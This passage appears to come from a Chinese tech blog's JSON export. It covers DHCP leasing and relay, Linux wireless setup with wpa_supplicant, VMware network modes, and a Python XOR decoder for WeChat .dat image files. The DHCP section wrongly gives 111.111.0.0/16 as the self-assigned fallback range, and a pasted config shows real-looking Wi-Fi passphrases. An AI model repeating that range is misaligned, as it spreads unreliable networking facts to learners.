会在T2时刻再次以广播的方式发送DHCP Request 报文，请求续租，这时如果DHCP Client 在租约时间到达之前收到R的DHCP Ack报文，则续租成功，重新开始租约期的计时，如果没收到，则续租失败，DHCP Client 不能继续使用这个IP地址，需要重新从发现阶段开始向DHCP服务器申请新的IP地址 （二）、DHCP中继 1、DHCP中继的使用场景 从前面DHCP的工作原理我们可以知道，DHCP Client 必须和DHCP Server 在同一个二层广播域中，才能接收到彼此发送的DHCP报文，DHCP报文是无法跨越二层广播域传播的。这时，我们可以有两种方法解决这个问题： （1）、在网络中的每个网段都设置一台DHCP Server，但是这个方法代价较大，很不经济，造成资源的很大浪费，所以现实中一般不推荐此方法 （2）、只设置一个DHCP Server，利用DHCP中继技术DHCP Relay 来实现一个DHCP Server 同时为多个二层广播域中的DHCP Client 服务，这样既节省成本，又便于集中管理 2、DHCP中继的工作原理如下图： 在DHCP中继的工作原理中和前面的DHCP工作原理基本相同，只是中间DHCP Relay 负责DHCP Client 和DHCP Server 之间的DHCP报文的转发，这里要注意的是：DHCP Relay 与DHCP Client 之间是以广播的方式进行交换DHCP报文的，而DHCP Relay 与DHCP Server 之间是以单播的方式来交换DHCP报文的。 dhcp的客户机的ip选择的问题： ​ 首先会申请上次接入网络的ip地址，如果这个ip地址未被占用而且是处于改dhcp的网段里面的ip地址，就会优先选择这一个ip地址，如果没有，那么我们就会在范围内从小到大的选择。 DHCP客户机的ip地址的租期问题： ​ 当客户机的租约期到%50的时候，会向DHCP服务器发送DHCP REQUEST消息包。 如果客户机接收到该服务器回应的DHCP ACK消息包，客户机就根据包中所提供的新的租期以及其它已经更新的TCP/IP参数，更新自己的配置，IP租用更新完成。 如果没有收到该服务器的回复，则客户机继续使用现有的IP地址，因为当前租期还有50%。 如果在租期过去50%的时候没有更新，则客户机将在租期过去87.5%的时候再次向为其提供IP地址的DHCP联系。 如果还不成功，到租约的100%时候，客户机必须放弃这个IP地址，重新申请。 如果此时无DHCP可用，客户机会使用111.111.0.0/16（你的dhcp服务器）中随机的一个地址，并且每隔5分钟再进行尝试"},{"title":"Linux无线网络配置","date":"2020-10-28","updated":"2024-03-19","path":"2020/10/28/Linux无线网络配置/","text":"0x01 基础方法 1. 查看USB设备lsusb 1234567 ⚡ root@kali  ~/Desktop  lsusb Bus 001 Device 005: ID 148f:3070 Ralink Technology, Corp. RT2870/RT3070 Wireless AdapterBus 001 Device 001: ID 1d6b:0002 Linux Foundation 2.0 root hubBus 002 Device 004: ID 0e0f:0008 VMware, Inc. VMware Virtual USB MouseBus 002 Device 003: ID 0e0f:0002 VMware, Inc. Virtual USB HubBus 002 Device 002: ID 0e0f:0003 VMware, Inc. Virtual MouseBus 002 Device 001: ID 1d6b:0001 Linux Foundation 1.1 root hub 在USB接口001/005上检测到网卡。 2. 查看无线网卡iwconfig 12345678910 ⚡ root@kali  ~/Desktop  iwconfiglo no wireless extensions.eth0 no wireless extensions.wlan0 IEEE 802.11 ESSID:off/any Mode:Managed Access Point: Not-Associated Tx-Power=0 dBm Retry short long limit:2 RTS thr:off Fragment thr:off Encryption key:off Power Management:off 3. 激活无线网卡wlan0 ifconfig wlan0 up 4. 扫描网络 iwlist wlan0 scanoriw dev wlan0 scan 发现未加密的网络 发现WPA2-PSK/WPA-PSK加密的网络 5. 连接网络 (1) 连接未加密网络 iw dev wlan0 connect [网络SSID] (2) 连接WEP加密网络 iw dev wlan0 connect [网络SSID] key 0:[WEP密钥] (3) 连接WPA加密网络 wpa_supplicant是一个连接、配置WIFI的工具，它主要包含wpa_supplicant与wpa_cli两个程序. 可以通过wpa_cli来进行WIFI的配置与连接,前提要保证wpa_supplicant正常启动 加密方式为 WPA-PSK 得用 wpa_supplicant 而不能使用 iwconfig wlan0 key xxx 形式，iwconfig key方式适用于WEP 新建文件 vim /etc/wpa_supplicant/my_wpa_supplicant.conf wpa_passphrase CU_511 4006181111 &gt; /etc/wpa_supplicant/my_wpa_supplicant.conf可生成密码 123456ctrl_interface=/var/run/wpa_supplicantnetwork=&#123; ssid=&quot;TP-LINK_22E1D2&quot; psk=&quot;密码&quot;&#125;# 其中的ctrl_interface就是用来和wpa_cli通信使用，其原理是wpa_supplicant是个干活的wifi服务器（比如连接wifi，断开wifi，启动热点等），wpa_cli就是个客户端，通过本地socket通信连接上wpa_supplicant服务器，发命令叫他干活。 连接wlan0到网络，并以daemon方式运行wpa_supplicant -B -i wlan0 -c /etc/my_wpa_supplicant.conf -B Background 在后台以daemon 运行 -i interface -c 配置文件 -D 驱动程序名称（可以是多个驱动程序：nl80211，wext） 如果想要看过程中的详细log，可以加上参数-dd，然后用logcat同时看log。 此时wlan0网络状态 6. 获取IP地址 最后，无论是连到开放的网络还是加密的安全网络，都得获取 IP 地址。简单地使用如下命令： (1) dhcpcd wlan0 dhcpcd会后台守护进程运行，下次重连wifi会自动获取IP (2) dhclient wlan0 7. 查看连接状态 (1) WPA wpa_cli status (2) 未加密，WEP iwconfig 8. 断开当前连接 (1) WEP，未加密： iw dev wlan0 disconnect (2) WPA：wpa_cli terminate 关闭某网卡ifconfig [网卡名] down 0x02 其他操作 有很多种方式来管理无线连接。刚才使用的是最基本的方式，有很多高级的应用程序（如 NetworkManager、wicd、netcfg、wifi 等等），他们是不包含在“默认包”里面的，使用它们会大大简化操作过程，但一般建议是开始的话最好从基本的来。 1. 设置IP地址ifconfig wlan0 [IP地址] 2. 查看路由表route 查看网关(缺省路由)方法： 1、route -n 或netstat -rn 2、ip route show 3. 添加默认网关 route add default gw [网关地址] dev wlan0 4. wpa_supplicant配置文件解读/etc/wpa_supplicant/my_wpa_supplicant.conf 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475# 请不要修改下面这一行内容，否则将不能正常工作 ctrl_interface=/var/run/wpa_supplicant # 确保只有root用户能读取WPA的配置 ctrl_interface_group=0 # 使用wpa_supplicant来扫描和选择AP ap_scan=1 # 简单的情形：WPA-PSk密码验证方式，PSK是ASCII密码短语，所有合法的加密方式都允许连接 network=&#123; ssid=&quot;simple&quot; psk=&quot;very secret passphrase&quot; # 优先级越高，就能越早匹配到。 priority=5 &#125; # 与前面的设置相同，www.linuxidc.com但要求对特定的SSID进行扫描（针对那些拒绝广播SSID的AP） network=&#123; ssid=&quot;second ssid&quot; scan_ssid=1 psk=&quot;very secret passphrase&quot; priority=2 &#125; # 仅使用WPA-PSK方式。允许使用任何合法的加密方式的组合 network=&#123; ssid=&quot;example&quot; proto=WPA key_mgmt=WPA-PSK pairwise=CCMP TKIP group=CCMP TKIP WEP104 WEP40 psk=06b4be19da289f475aa46a33cb793029d4ab3db7a23ee92382eb0106c72ac7bb priority=2 &#125; # 明文连接方式（不使用WPA和IEEE802.1X） network=&#123; ssid=&quot;plaintext-test&quot; key_mgmt=NONE &#125; # 共享WEP秘钥连接方式（不使用WPA和IEEE802.1X） network=&#123; ssid=&quot;static-wep-test&quot; key_mgmt=NONE wep_key0=&quot;abcde&quot; wep_key1=0102030405 wep_key2=&quot;1234567890123&quot; wep_tx_keyidx=0 priority=5 &#125; # 共享WEP秘钥连接方式（无WPA和IEEE802.1X），使用共享秘钥IEEE802.11验证方式 network=&#123; ssid=&quot;static-wep-test2&quot; key_mgmt=NONE wep_key0=&quot;abcde&quot; wep_key1=0102030405 wep_key2=&quot;1234567890123&quot; wep_tx_keyidx=0 priority=5 auth_alg=SHARED &#125; # 在IBSS/ad-hoc网络中使用WPA-None/TKIP network=&#123; ssid=&quot;test adhoc&quot; mode=1 proto=WPA key_mgmt=WPA-NONE pairwise=NONE group=TKIP psk=&quot;secret passphrase&quot; &#125; 5. wpa_cli的使用 (1) 1234567891011121314151617181920212223wpa_cli -i wlan0 scan //搜索附件wifi热点wpa_cli -i wlan0 scan_result //显示搜索wifi热点wpa_cli -i wlan0 status //当前WPA/EAPOL/EAP通讯状态wpa_cli -i wlan0 ping //pings wpa_supplicant添加新的连接wpa_cli -i wlan0 add_network //添加一个网络连接,会返回&lt;network id&gt; wpa_cli set_network &lt;network id&gt; ssid &#x27;&quot;name&quot;&#x27; //ssid名称 wpa_cli set_network &lt;network id&gt; psk &#x27;“psk”&#x27; //密码wpa_cli set_network &lt;network id&gt; scan_ssid 1 wpa_cli set_network &lt;network id&gt; priority 1 //优先级保存连接wpa_cli -i wlan0 save_config //信息保存到默认的配置文件中1断开连接wpa_cli -i wlan0 disable_network &lt;network id&gt; 1连接已有连接wpa_cli -i wlan0 list_network //列举保存过得连接wpa_cli -i wlan0 select_network &lt;network id&gt; //连接指定的ssid wpa_cli -i wlan0 enable_network &lt;network id&gt; //使能制定的ssid (2) 交互式wpa_cli 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142实操：&gt; scanOK&lt;3&gt;CTRL-EVENT-STATE-CHANGE id=-1 state=3 BSSID=00:00:00:00:00:00 SSID=&lt;3&gt;CTRL-EVENT-SCAN-STARTED&lt;3&gt;CTRL-EVENT-SCAN-RESULTS&lt;3&gt;WPS-AP-AVAILABLE&lt;3&gt;CTRL-EVENT-STATE-CHANGE id=-1 state=2 BSSID=00:00:00:00:00:00 SSID=&lt;3&gt;CTRL-EVENT-NETWORK-NOT-FOUND&gt;&gt; scan_resultsbssid / frequency / signal level / flags / ssid04:a1:51:8a:9c:ae 5745 -53 [WPA2-PSK-CCMP][WPS][ESS] NETGEAR-63-5GTP-LINK_5G_MT3b8:a3:86:5:8f:b2 2437 -79 [WPA-PSK-CCMP+TKIP][WPA2-PSK-CCMP+TKIP][WPS][ESS] SS7_VPN40:e3:d6:8f:59:83 2462 -81 [WPA2-EAP-CCMP][ESS] mtkemp38:97:d6:18:c4:00 5805 -85 [WPA-PSK-TKIP][WPA2-PSK-TKIP][ESS] wnwyanfa40:e3:d6:8f:59:81 2462 -82 [WPA-EAP-CCMP+TKIP][WPA2-EAP-CCMP+TKIP][ESS] 0c:72:2c:4f:41:66 2427 -88 [WPA-PSK-CCMP+TKIP][WPA2-PSK-CCMP+TKIP][WPS][ESS] ......fc:75:16:a3:95:d0 2462 -76 [WPS][ESS] dlink00:0c:43:28:08:88 2437 -78 [ESS] MT7623_AP_2.4G6c:f3:7f:38:ff:e8 5785 -85 [ESS] mtkguest40:e3:d6:8f:59:40 2462 -75 [ESS] mtkguest6c:f3:7f:38:ff:e0 2462 -85 [ESS] mtkguest&gt; list_networknetwork id / ssid / bssid / flags0 Xiaomi_5G any [DISABLED]1 D8_5GHZ any [DISABLED]2 SS7_VPN any [DISABLED]3 Xiaomi_2.4G any [DISABLED4 XIaomi_5G any [DISABLED]5 hello any [DISABLED]6 NETGEAR6200 any [DISABLED]7 NETGEAR6200_5G any [DISABLED]8 NETGEAR-63-2.4G any [DISABLED]9 DLink88_24G any [DISABLED]&gt; add_network 1010&gt; set_network 10 ssid &quot;NETGEAR-63-5G&quot;OK&gt; list_network network id / ssid / bssid / flags0 Xiaomi_5G any [DISABLED]1 D8_5GHZ any [DISABLED]2 SS7_VPN any [DISABLED]3 Xiaomi_2.4G any [DISABLED]4 XIaomi_5G any [DISABLED]5 hello any [DISABLED]6 NETGEAR6200 any [DISABLED]7 NETGEAR6200_5G any [DISABLED]8 NETGEAR-63-2.4G any [DISABLED]9 DLink88_24G any [DISABLED]10 NETGEAR-63-5G any [DISABLED]&gt; set_network 10 key_mgmt WPA-PSK OK&gt; set_network 10 psk &quot;11111111&quot; OK&gt; get_network 10 key_mgmtWPA-PSK&gt; get_network 10 psk *&gt; enable_network 10OK&lt;3&gt;CTRL-EVENT-STATE-CHANGE id=-1 state=3 BSSID=00:00:00:00:00:00 SSID=&lt;3&gt;CTRL-EVENT-SCAN-STARTED&lt;3&gt;CTRL-EVENT-SCAN-RESULTS&lt;3&gt;WPS-AP-AVAILABLE&lt;3&gt;Trying to associate with [18434.676000] 80211&gt; Connect bssid 04:a1:51:8a:9c:ae&gt; select_network 10OK&gt; reconnectOK&gt; list_network network id / ssid / bssid / flags0 Xiaomi_5G any [DISABLED]1 D8_5GHZ any [DISABLED]2 SS7_VPN any [DISABLED]3 Xiaomi_2.4G any [DISABLED]4 XIaomi_5G any [DISABLED]5 hello any [DISABLED]6 NETGEAR6200 any [DISABLED]7 NETGEAR6200_5G any [DISABLED]8 NETGEAR-63-2.4G any [DISABLED]9 DLink88_24G any [DISABLED]10 NETGEAR-63-5G any [CURRENT]&gt; save_configOK&gt; statusbssid=04:a1:51:8a:9c:aefreq=5745ssid=NETGEAR-63-5Gid=10mode=stationpairwise_cipher=CCMPgroup_cipher=CCMPkey_mgmt=WPA2-PSKwpa_state=COMPLETEDip_address=10.0.0.5address=00:6c:fd:ab:68:beuuid=12345678-9abc-def0-1234-56789abcdef0&lt;3&gt;CTRL-EVENT-STATE-CHANGE id=10 state=9 BSSID=04:a1:51:8a:9c:ae SSID=NETGEAR-63-5G&lt;3&gt;CTRL-EVENT-CONNECTED - connection to 04:a1:51:8a:9c:ae completed (auth) [id=10 id_str=] 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104保存后的wap_supplicant.confroot@:/system/bin # cd /data/misc/wifi/ root@:/data/misc/wifi # cat wpa_supplicantwpa_supplicant.conf wpa_supplicant/ at wpa_supplicant.conf &lt;ctrl_interface=/data/misc/wifi/socketsdriver_param=p2p_capable=0update_config=1uuid=12345678-9abc-def0-1234-56789abcdef0device_name=fullmanufacturer= Group Co., Ltdmodel_name=Android TVmodel_number=Android TVserial_number=123456789device_type=10-0050F204-5os_version=01020300config_methods=physical_display virtual_push_buttonexternal_sim=1wowlan_triggers=magic_pktnetwork=&#123; ssid=&quot;Xiaomi_5G&quot; psk=&quot;26630099&quot; key_mgmt=WPA-PSK priority=12 disabled=1&#125;network=&#123; ssid=&quot;D8_5GHZ&quot; key_mgmt=NONE priority=9 disabled=1&#125;network=&#123; ssid=&quot;SS7_VPN&quot; psk=&quot;12345678&quot; key_mgmt=WPA-PSK priority=11 disabled=1&#125;network=&#123; ssid=&quot;Xiaomi_2.4G&quot; psk=&quot;26630099&quot; key_mgmt=WPA-PSK priority=13 disabled=1&#125;network=&#123; ssid=&quot;XIaomi_5G&quot; psk=&quot;26630099&quot; key_mgmt=WPA-PSK priority=18 disabled=1&#125;network=&#123; ssid=&quot;hello&quot; key_mgmt=NONE priority=17 disabled=1&#125;network=&#123; ssid=&quot;NETGEAR6200&quot; psk=&quot;12345678&quot; key_mgmt=WPA-PSK priority=19 disabled=1&#125;network=&#123; ssid=&quot;NETGEAR6200_5G&quot; psk=&quot;12345678&quot; key_mgmt=WPA-PSK priority=27 disabled=1&#125;network=&#123; ssid=&quot;NETGEAR-63-2.4G&quot; psk=&quot;11111111&quot; key_mgmt=WPA-PSK priority=56 disabled=1&#125;network=&#123; ssid=&quot;DLink88_24G&quot; psk=&quot;12345678&quot; key_mgmt=WPA-PSK priority=38 disabled=1&#125;network=&#123; ssid=&quot;NETGEAR-63-5G&quot; psk=&quot;11111111&quot; key_mgmt=WPA-PSK&#125; 6. dhclient自动获取/重新获取IP (1) 获取IP dhclient eth1 There is no need to restart network service. Above command should work with any Linux distro such as RHEL, Fedora, CentOS, Ubuntu and others. On a related note you can also try out the following commands: 查看结果 12方法1ifconfig wlan0 12方法-2，显示更详细cat /var/lib/dhcp/dhclient.leases (2) 释放IP dhclient -r dhclient -r并没有真正释放IP，下一次执行dhclient wlan0时，没有discover这个步骤，而是直接REQUEST上次IP。 在网络拓扑或者配置变化的情况下，获取不到IP，需要删除cat /var/lib/dhcp/dhclient.leases 文件 查看进程 ps aux|grep dhc (3) 删除相关文件后，重新获取ipdhclient wlan0，这是个非常漫长的过程 服务器拒绝了很多次 最终获取到了IP地址 至于为什么DHCP服务器拒绝了这么多次，可能因为校园网人数太多，dhcp申请太过频繁，DHCP服务器广播的offer很快就被其他人使用了，导致我的request发到服务器的时候服务器发现刚刚那个offer已经被用掉了，所以就发送NAK来拒绝我们的申请 DHCP报文共有一下几种： DHCP DISCOVER ：客户端开始DHCP过程发送的包，是DHCP协议的开始 DHCP OFFER ：服务器接收到DHCP DISCOVER之后做出的响应，它包括了给予客户端的IP（yiaddr）、客户端的MAC地址、租约过期时间、服务器的识别符以及其他信息 DHCP REQUEST ：客户端对于服务器发出的DHCP OFFER所做出的响应。在续约租期的时候同样会使用。 DHCP ACK ：服务器在接收到客户端发来的DHCP REQUEST之后发出的成功确认的报文。在建立连接的时候，客户端在接收到这个报文之后才会确认分配给它的IP和其他信息可以被允许使用。 DHCP NAK ：DHCP ACK的相反的报文，表示服务器拒绝了客户端的请求。 DHCP RELEASE ：一般出现在客户端关机、下线等状况。这个报文将会使DHCP服务器释放发出此报文的客户端的IP地址 DHCP INFORM ：客户端发出的向服务器请求一些信息的报文 DHCP DECLINE :当客户端发现服务器分配的IP地址无法使用（如IP地址冲突时），将发出此报文，通知服务器禁止 使用该IP地址。 DHCP详细工作流程解析 第一步： DHCP客户端主动发起DHCP Discover包，用来寻找DHCP服务器，其中： 源MAC是自己的MAC地址，目的MAC是FFFF.FFFF.FFFF的广播 源IP是0.0.0.0（现在还没有IP，就用全0地址），目的IP是255.255.255.255的三层广播 因为DHCP服务器在哪里还不知道，所以使用广播来寻找，广播会泛洪到整个网段中； 第二步： DHCP服务器收到客户端发的DHCP Discover之后，会在自己的地址池中拿出一个没有分配的地址以及配套的参数（如：掩码、DNS、网关、域名、租期……），然后以一个DHCP Offer包发送出去。 这个DHCP Offer数据包的地址如下： 源MAC是DHCP服务器的MAC，目的MAC是FFFF.FFFF.FFFF的广播 源IP是DHCP服务器的IP，目的IP是255.255.255.255的广播 这时客户端还没有获得IP，DHCP服务器端现在还无法定位客户端，所以用广播来回应。 第三步： 客户端收到这个DHCP Offer后，会再发出一个DHCP Request给服务器来申请这个Offer中包含的地址。 这个时候，客户端还没有正式拿到地址，所以还需要向DHCP服务器申请。 这时客户端的源IP还是0.0.0.0，目的IP还是255.255.255.255 源MAC是客户端的MAC，目的MAC是FFFF.FFFF.FFFF广播包 第四步： 服务器收到客户端的请求后，会发出一个DHCP ACK用来确认这个IP地址可以分配给这个客户端。 客户端收到第四个DHCP ACK数据包才算正式拿到了这个IP。 0x03 出现的错误 关闭wpa连接时出现Failed to connect to non-global ctrl_ifname: (nil) error: No such file or directory 这是Wpa_supplicant没有在后台运行的原因 解决办法：让wpa_supplicat在后台运行,nohup wpa_supplicant -c wpa.conf &gt; /tmp/wpa_supplicant.log &amp;或者-B参数 Wpa_supplicant 调试故障原因分析 linux下使用shell命令通过wpa_cli控制wpa_supplicant连接wifi DHCP工作原理 DHCP工作过程详解 https://blog.csdn.net/yugongpeng_blog/article/details/45169291"},{"title":"虚拟机三种网络模式","date":"2020-10-28","updated":"2024-03-19","path":"2020/10/28/虚拟机三种网络模式/","text":"01. VMware虚拟机三种网络模式 vmware为我们提供了三种网络工作模式，它们分别是：Bridged（桥接模式）、NAT（网络地址转换模式）、Host-Only（仅主机模式）。 打开vmware虚拟机，我们可以在选项栏的“编辑”下的“虚拟网络编辑器”中看到VMnet0（桥接模式）、VMnet1（仅主机模式）、VMnet8（NAT模式），那么这些都是有什么作用呢？其实，我们现在看到的VMnet0表示的是用于桥接模式下的虚拟交换机；VMnet1表示的是用于仅主机模式下的虚拟交换机；VMnet8表示的是用于NAT模式下的虚拟交换机。 同时，在主机上对应的有VMware Network Adapter VMnet1和VMware Network Adapter VMnet8两块虚拟网卡，它们分别作用于仅主机模式与NAT模式下。在“网络连接”中我们可以看到这两块虚拟网卡，如果将这两块卸载了，可以在vmware的“编辑”下的“虚拟网络编辑器”中点击“还原默认设置”，可重新将虚拟网卡还原。 小伙伴看到这里，肯定有疑问，为什么在真机上没有VMware Network Adapter VMnet0虚拟网卡呢？那么接下来，我们就一起来看一下这是为什么。 02. Bridged（桥接模式） 什么是桥接模式？桥接模式就是将主机网卡与虚拟机虚拟的网卡利用虚拟网桥进行通信。在桥接的作用下，类似于把物理主机虚拟为一个交换机，所有桥接设置的虚拟机连接到这个交换机的一个接口上，物理主机也同样插在这个交换机当中，所以所有桥接下的网卡与网卡都是交换模式的，相互可以访问而不干扰。在桥接模式下，虚拟机ip地址需要与主机在同一个网段，如果需要联网，则网关与DNS需要与主机网卡一致。其网络结构如下图所示： 接下来，我们就来实际操作，如何设置桥接模式。 首先，安装完系统之后，在开启系统之前，点击“编辑虚拟机设置”来设置网卡模式。 点击“网络适配器”，选择“桥接模式”，然后“确定” 在进入系统之前，我们先确认一下主机的ip地址、网关、DNS等信息。 然后，进入系统编辑网卡配置文件，命令为vi /etc/sysconfig/network-scripts/ifcfg-eth0 添加内容如下： 编辑完成，保存退出，然后重启虚拟机网卡，使用ping命令ping外网ip，测试能否联网。 能ping通外网ip，证明桥接模式设置成功。 那主机与虚拟机之间的通信是否正常呢？我们就用远程工具来测试一下。 主机与虚拟机通信正常。 这就是桥接模式的设置步骤，相信大家应该学会了如何去设置桥接模式了。桥接模式配置简单，但如果你的网络环境是ip资源很缺少或对ip管理比较严格的话，那桥接模式就不太适用了。如果真是这种情况的话，我们该如何解决呢？接下来，我们就来认识vmware的另一种网络模式：NAT模式。 03. NAT（地址转换模式） 刚刚我们说到，如果你的网络ip资源紧缺，但是你又希望你的虚拟机能够联网，这时候NAT模式是最好的选择。NAT模式借助虚拟NAT设备和虚拟DHCP服务器，使得虚拟机可以联网。其网络结构如下图所示： 在NAT模式中，主机网卡直接与虚拟NAT设备相连，然后虚拟NAT设备与虚拟DHCP服务器一起连接在虚拟交换机VMnet8上，这样就实现了虚拟机联网。那么我们会觉得很奇怪，为什么需要虚拟网卡VMware Network Adapter VMnet8呢？原来我们的VMware Network Adapter VMnet8虚拟网卡主要是为了实现主机与虚拟机之间的通信。在之后的设置步骤中，我们可以加以验证。 首先，设置虚拟机中NAT模式的选项，打开vmware，点击“编辑”下的“虚拟网络编辑器”，设置NAT参数及DHCP参数。 设置网关 设置DHCP 将虚拟机的网络连接模式修改成NAT模式，点击“编辑虚拟机设置”。 点击“网络适配器”，选择“NAT模式” 然后开机启动系统，编辑网卡配置文件，命令为vi /etc/sysconfig/network-scripts/ifcfg-eth0 具体配置如下： 编辑完成，保存退出，然后重启虚拟机网卡，动态获取ip地址，使用ping命令ping外网ip，测试能否联网。 之前，我们说过VMware Network Adapter VMnet8虚拟网卡的作用，那我们现在就来测试一下。 将VMware Network Adapter VMnet8虚拟网卡禁用，然后，从虚拟机ping外网，看看是否能ping通？ 可以ping通外网 如此看来，虚拟机能联通外网，确实不是通过VMware Network Adapter VMnet8虚拟网卡，那么为什么要有这块虚拟网卡呢？ 之前我们就说VMware Network Adapter VMnet8的作用是主机与虚拟机之间的通信，接下来，我们就用远程连接工具来测试一下。 然后，将VMware Network Adapter VMnet8启用之后，发现远程工具可以连接上虚拟机了。 那么，这就是NAT模式，利用虚拟的NAT设备以及虚拟DHCP服务器来使虚拟机连接外网，而VMware Network Adapter VMnet8虚拟网卡是用来与虚拟机通信的。 04. Host-Only（仅主机模式） Host-Only模式其实就是NAT模式去除了虚拟NAT设备，然后使用VMware Network Adapter VMnet1虚拟网卡连接VMnet1虚拟交换机来与虚拟机通信的，Host-Only模式将虚拟机与外网隔开，使得虚拟机成为一个独立的系统，只与主机相互通讯。其网络结构如下图所示： 通过上图，我们可以发现，如果要使得虚拟机能联网，我们可以将主机网卡共享给VMware Network Adapter VMnet1网卡，从而达到虚拟机联网的目的。接下来，我们就来测试一下。 首先设置“虚拟网络编辑器”，可以设置DHCP的起始范围。 设置虚拟机为Host-Only模式。 开机启动系统，然后设置网卡文件。 保存退出，然后重启网卡，利用远程工具测试能否与主机通信。 机与虚拟机之间可以通信，现在设置虚拟机联通外网。 我们可以看到上图有一个提示，强制将VMware Network Adapter VMnet1的ip设置成192.168.137.1，那么接下来，我们就要将虚拟机的DHCP的子网和起始地址进行修改，点击“虚拟网络编辑器” 重新配置网卡，将VMware Network Adapter VMnet1虚拟网卡作为虚拟机的路由。 重启网卡，然后通过 远程工具测试能否联通外网以及与主机通信。 测试结果证明可以使得虚拟机连接外网。 以上就是关于vmware三种网络模式的工作原理及配置详解。"},{"title":"微信dat文件转图片","date":"2020-10-23","updated":"2024-03-19","path":"2020/10/23/微信dat文件转图片/","text":"0x00 今天上python课听到老师中途提起说 有很多微信接收的dat文件,但是暂时不清楚如何解密成图片,所以回来准备自己研究研究(折腾折腾),帮老师解决一下问题~ 顺便减轻一下上课不听课的愧疚感 0x01 分析 首先找一下微信存储文件的地方在哪里,一通(百度)研究发现存储的路径如下C:\\Users\\用户\\Documents\\WeChat Files\\wxid_kxxxxxxx\\FileStorage\\Image 根据文件夹名字也能发现这些文件应该就是加密后的图片文件了,16进制编辑器看一看 发现大部分文件开头都是7D5A, 众所周知jpg格式开头几个字节为0xFFD8, 不如做个异或看看 dat文件和正常jpg文件前两个字节异或结果为0x8282, 推测是不是dat文件所有字节都异或了0x82, 随便挑一个dat文件,把其中所有的字节挨个异或0x82 成功恢复成了图片! 推测是正确的 0x02 发现问题 不过经过测试有时候脚本会失效,Why? 前面还提到有些文件接收后开头不是7D5A,这是非Jpg格式图片加密后的存储,经过研究发现密钥依然是Jpg格式加密的密钥。如果脚本第一次检测的不是Jpg格式的图片的话，就拿不到正确的密钥，自然就失效了 改进函数 根据规律改进一下自动检测密钥的函数，找到一个dat文件后依次与jpg,png,gif的头部做异或，如果异或的前两个字节一样则就确定了密钥 如果脚本失效则手动解决 如果脚本依然失效的话就手动解决，方法就是找一个Jpg格式的图片通过微信传输过去，然后在微信存储图片的那个目录下找到刚刚新增加的dat文件，把这个文件拿去用脚本跑一次，脚本会显示出正确的密钥 然后把这个值填写进脚本的secretKey中即可 0x03 Talk is cheap ,Show the code 使用的时候只需要改inpath和out_path两个变量就好了 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697# @Time : 2020/10/23 21:54# @Author : LYC# @File : 微信Dat文件转图片# jpg FFD8 xor 7D5A = 8282#import osinpath = r&quot;D:/CTF文件/微信dat文件/&quot;out_path = r&quot;D:/CTF文件/微信dat文件/&quot;jpg = 0xFFD8png = 0x8950gif = 0x4749secretKey = 0x00 # 改为 0x00 程序运行时将自动检测秘钥,自动检测如果失效需要手动修改这个值def autoCheck(path): global secretKey if secretKey != 0x00: pass else: print(&quot;[*] autoCheck:&quot;) file_List = os.listdir(path) for file_Name in file_List: file_WithPath = os.path.join(path, file_Name) if file_WithPath.endswith(&quot;dat&quot;): print(f&quot;[*] 检测dat文件: &#123;file_Name&#125;&quot;) with open(file_WithPath, &quot;rb&quot;) as raw_DatFile: #head2Byte = raw_DatFile.read(2) head2Byte = int.from_bytes(raw_DatFile.read(2), byteorder=&#x27;big&#x27;) # 获取前两个字节 for i in [jpg,png,gif]: # 分别和各种格式做异或 LowByte = (head2Byte ^ i) &gt;&gt; 8 HighByte = (head2Byte ^ i) &amp; 0x00FF if LowByte == HighByte : # 找到秘钥 secretKey = LowByte print(f&quot;[*] SecretKey: &#123;hex(secretKey)&#125;&quot;) break break else: pass if secretKey == 0x00: # 检测不到秘钥手动输入 while True: try: secretKey = int(input(&quot;[#] 未找到秘钥,可手动输入(例如0x82): &quot;),16) except: print(&quot;格式错误,正确格式如: 0x82&quot;) else: break# 检查一共有多少种类型的文件def checkFileTypes(path): print(f&quot;[*] 当前目录: &#123;path&#125;&quot;) fileTypes = set() # 统计有几种文件类型 file_List = os.listdir(path) for file_Name in file_List: file_WithPath = os.path.join(path, file_Name) if file_WithPath.endswith(&quot;dat&quot;): print(f&quot;[*] dat文件: &#123;file_Name&#125;&quot;) with open(file_WithPath, &quot;rb&quot;) as raw_DatFile: # head2Byte = raw_DatFile.read(2) head2Byte = int.from_bytes(raw_DatFile.read(2), byteorder=&#x27;big&#x27;) # 获取前两个字节 fileTypes.add(hex(head2Byte)) else: pass print(f&quot;文件类型数量: &#123;fileTypes&#125;&quot;)def imageDecode(file_WithPath, file_Name): out = out_path+file_Name+&quot;.png&quot; with open(file_WithPath, &quot;rb&quot;) as dat_read, open(out, &quot;wb&quot;) as png_write: for now in dat_read: # 逐字节异或解码 for nowByte in now: newByte = nowByte ^ secretKey png_write.write(bytes([newByte]))def findFile(path): autoCheck(path) # 自动检测秘钥 print(f&quot;[*] 当前目录: &#123;path&#125;&quot;) file_List = os.listdir(path) for file_Name in file_List: file_WithPath = os.path.join(path, file_Name) if file_WithPath.endswith(&quot;dat&quot;): print(f&quot;[*] dat文件: &#123;file_Name&#125;&quot;) imageDecode(file_WithPath,file_Name) else: pass#checkFileTypes(r&quot;C:\\Users\\hxxx\\Documents\\WeChat Files\\wxxxxx\\FileStorage\\Image\\2020-06&quot;)findFile(inpath) 0x04 解密后发现我微信为什么会悄悄存储了这么多乱七八糟我没见过的图片… amazing…"},{"title":"Linux-防火墙","date":"2020-10-05","updated":"2024-03-19","path":"2020/10/05/Linux-防火墙/","text":"8.1 防火墙管理工具 在RHEL 7系统中，firewalld防火墙取代了iptables防火墙。其实，iptables与firewalld都不是真正的防火墙，它们都只是用来定义防火墙策略的防火墙管理工具而已，或者说，它们只是一种服务。**iptables服务会把配置好的防火墙策略交由内核层面的netfilter网络过滤器来处理，而firewalld服务则是把配置好的防火墙策略交由内核层面的nftables包过滤框架来处理。**换句话说，当前在Linux系统中其实存在多个防火墙管理工具，旨在方便运维人员管理Linux系统中的防火墙策略，我们只需要配置妥当其中的一个就足够了。虽然这些工具各有优劣，但它们在防火墙策略的配置思路上是保持一致的。 8.2.1 策略与规则链 